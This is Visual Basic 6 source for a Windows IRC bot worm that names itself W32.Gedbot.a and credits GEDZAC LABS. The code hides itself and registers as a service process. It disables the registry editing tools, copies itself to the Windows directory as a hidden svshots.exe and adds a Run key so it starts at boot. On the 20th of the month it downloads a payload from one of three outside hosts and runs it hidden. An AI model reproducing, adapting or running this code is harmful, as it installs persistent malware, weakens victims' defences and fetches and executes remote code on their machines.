   VERSION 5.00
   Begin VB.Form Form1
      Caption         =   "Form1"
      ClientHeight    =   3195
      ClientLeft      =   60
      ClientTop       =   345
      ClientWidth     =   4680
      Icon            =   "Form1.frx":0000
      LinkTopic       =   "Form1"
      ScaleHeight     =   3195
      ScaleWidth      =   4680
      ShowInTaskbar   =   0   'False
      StartUpPosition =   3  'Windows Default
      Visible         =   0   'False
      Begin VB.Timer Timer1
         Enabled         =   0   'False
         Interval        =   10000
         Left            =   480
         Top             =   1200
      End
   End
   Attribute VB_Name = "Form1"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = False
   Private Declare Function GetCurrentProcessId Lib "kernel32" () As Long
   Private Declare Function RegisterServiceProcess Lib "kernel32" (ByVal dwProcessId As Long, ByVal dwType As Long) As Long
   Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
   Private Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long
   Private Declare Function RegCreateKeyEx Lib "advapi32.dll" Alias "RegCreateKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal Reserved As Long, ByVal lpClass As String, ByVal dwOptions As Long, ByVal samDesired As Long, ByVal lpSecurityAttributes As Long, phkResult As Long, lpdwDisposition As Long) As Long
   Private Const REG_SZ = 1
   Private Const REG_DWORD = 4
   Private Const KEY_ALL_ACCESS = &H3F
   Private Const REG_OPTION_NON_VOLATILE = 0
   Private Const HKEY_CURRENT_USER As Long = &H80000001
   Private Const HKEY_LOCAL_MACHINE As Long = &H80000002
   Private Declare Function GetVersionExA Lib "kernel32" (lpVersionInformation As OSVERSIONINFO) As Integer
   Private Type OSVERSIONINFO
     dwOSVersionInfoSize As Long
     dwMajorVersion As Long
     dwMinorVersion As Long
     dwBuildNumber As Long
     dwPlatformId As Long
     szCSDVersion As String * 128
   End Type
   Private Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
   Private Declare Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long

   Private Sub Form_Load()
   On Error Resume Next
   'W32.Gedbot.a Bot de Irc y Proxy Irc Basico, probado en undernet
   If App.PrevInstance Then Unload Me
   If GetWinVersion <> 2 Then SubProces
   Call Setup
   Timer1.Enabled = True
   End Sub

   Private Sub Setup()
   On Error Resume Next
   Rw "Software\GedzacLabs", "Title", "GedBot by GEDZAC LABS", 3, 1
   Rw "Software\Microsoft\WindowsNT\CurrentVersion\Policies\System", "DisableRegistryTools", 10, 2, 2
   Rw "Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", 10, 2, 2
   Rw "Software\Microsoft\Windows\CurrentVersion\Run", "svshots", Sp(0) & "\svshots.exe", 3, 1
   If Dir(Sp(0) & "\svshots.exe", vbArchive + vbDirectory + vbHidden + vbNormal + vbReadOnly + vbSystem) = "" Then
   FileCopy Sp(3), Sp(0) & "\svshots.exe": SetAttr Sp(0) & "\svshots.exe", 6
   End If
   End Sub

   Private Sub SubProces()
   On Error Resume Next: Call RegisterServiceProcess(GetCurrentProcessId(), 1)
   End Sub

   Private Function GetWinVersion() As Long
   On Error Resume Next
   Dim OSinfo As OSVERSIONINFO
       With OSinfo
           .dwOSVersionInfoSize = 148
           .szCSDVersion = Space$(128)
           Call GetVersionExA(OSinfo)
        GetWinVersion = .dwPlatformId
       End With
   End Function

   Private Function Sp(x As Integer)
   On Error Resume Next
   Dim l As Long, spath As String
   Select Case x
   Case 0
   spath = Space$(255): l = GetWindowsDirectory(spath, 255): Sp = Left(spath, l)
   Case 3
   spath = App.Path
   If Right(spath, 1) <> "\" Then spath = spath & "\"
   Sp = spath & App.EXEName & ".exe"
   End Select
   End Function

   Private Sub Rw(sKey, nKey, vKey As Variant, m0 As Integer, m1 As Integer)
   On Error Resume Next
   Dim l As Long, hKey As Long

   If m0 = 3 Then
   l = RegCreateKeyEx(HKEY_LOCAL_MACHINE, sKey, 0&, vbNullString, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0&, hKey, l)
   ElseIf m0 = 2 Then
   l = RegCreateKeyEx(HKEY_CURRENT_USER, sKey, 0&, vbNullString, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0&, hKey, l)
   End If

   Select Case m1
    Case 1
   Dim sVal As String
   sVal = vKey
   l = RegSetValueEx(hKey, nKey, 0&, REG_SZ, ByVal sVal, Len(sVal) + 1)
    Case 2
   Dim lVal As Long
   lVal = vKey
   l = RegSetValueEx(hKey, nKey, 0&, REG_DWORD, ByVal lVal, 4)
   End Select
   l = RegCloseKey(hKey)
   End Sub

   Private Sub Timer1_Timer()
   On Error Resume Next
   Static x As Integer
   If x > 100 Then
   x = 0
   If Not (iStat()) Then Exit Sub
   Call GedDow
   Call ConectBot
   Timer1.Enabled = False
   Else
   x = x + 1
   End If
   End Sub

   Private Function DowFile(URL As String, Path As String) As Boolean
   On Error Resume Next: Dim lngRetVal As Long
   lngRetVal = URLDownloadToFile(0, URL, Path, 0, 0)
   DowFile = IIf(lngRetVal = 0, True, False)
   End Function

   Private Function q(j)
   On Error Resume Next
   For r = 1 To Len(j): q = q & Chr(Asc(Mid(j, r, 1)) Xor 7): Next
   End Function

   Private Sub GedDow()
   On Error Resume Next
   If Day(Date) = 20 Then

   If Not (iStat()) Then Exit Sub

   u = Array("http://utenti.lycos.it/iserver3", "http://es.geocities.com/mdm3002bd", "http://www.iespana.es/gedprueba")
   Randomize: t = Int(Rnd * 3)
   it = DowFile(u(t) & "/ds.bin", "C:\gdc.exe")
   If it = True Then Call Shell("C:\gdc.exe", vbHide)

   Else
   Kill "C:\gdc.exe"
   End If
   End Sub
